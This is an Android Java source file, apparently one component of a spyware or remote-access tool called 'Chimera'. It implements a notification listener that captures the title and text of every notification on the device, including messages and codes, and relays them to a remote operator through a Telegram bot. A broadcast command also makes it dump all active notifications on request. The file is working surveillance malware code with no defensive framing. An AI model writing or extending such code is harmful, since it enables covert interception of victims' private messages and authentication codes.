package com.chimera;

import android.app.Notification;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationListener extends NotificationListenerService {

    private final String CLIPBOARD_PACKAGE = "com.android.clipboarduiservice";
    private BroadcastReceiver notificationCommandReceiver;

    @Override
    public void onCreate() {
        super.onCreate();
        notificationCommandReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if ("com.chimera.GET_ACTIVE_NOTIFICATIONS".equals(intent.getAction())) {
                    processAndSendActiveNotifications();
                }
            }
        };
        registerReceiver(notificationCommandReceiver, new IntentFilter("com.chimera.GET_ACTIVE_NOTIFICATIONS"));
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (notificationCommandReceiver != null) {
            unregisterReceiver(notificationCommandReceiver);
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        String packageName = sbn.getPackageName();

        if (CLIPBOARD_PACKAGE.equals(packageName)) {
            return;
        }

        String filter = TelegramBotWorker.getNotificationFilter();
        if (filter == null || filter.isEmpty() || filter.equals(packageName)) {
            sendNotificationData("New Notification", sbn);
        }
    }

    private void processAndSendActiveNotifications() {
        try {
            StatusBarNotification[] activeNotifications = getActiveNotifications();
            if (activeNotifications == null || activeNotifications.length == 0) {
                TelegramBotWorker.sendMessage("No active notifications found.", getApplicationContext());
                return;
            }
            TelegramBotWorker.sendMessage("--- Reading " + activeNotifications.length + " Active Notifications ---", getApplicationContext());
            for (StatusBarNotification sbn : activeNotifications) {
                sendNotificationData("Existing Notification", sbn);
            }
        } catch (Exception e) {
            TelegramBotWorker.sendMessage("Error reading active notifications. Is permission granted?", getApplicationContext());
            ErrorLogger.logError(getApplicationContext(), "GetActiveNotifications", e);
        }
    }

    private void sendNotificationData(String type, StatusBarNotification sbn) {
        Notification notification = sbn.getNotification();
        if (notification == null) return;

        Bundle extras = notification.extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "No Title");
        CharSequence textChars = extras.getCharSequence(Notification.EXTRA_TEXT);
        CharSequence bigTextChars = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
        
        String text = (textChars != null) ? textChars.toString() : "";
        if (bigTextChars != null && bigTextChars.length() > text.length()) {
            text = bigTextChars.toString();
        }

        if (text.isEmpty()) {
            text = "No Text Content";
        }
        
        String app = sbn.getPackageName();
        String fullMessage = String.format("*[%s]*\n`App:` %s\n`Title:` %s\n`Text:` %s", type, app, title, text);
        TelegramBotWorker.sendMessage(fullMessage, getApplicationContext());
    }
}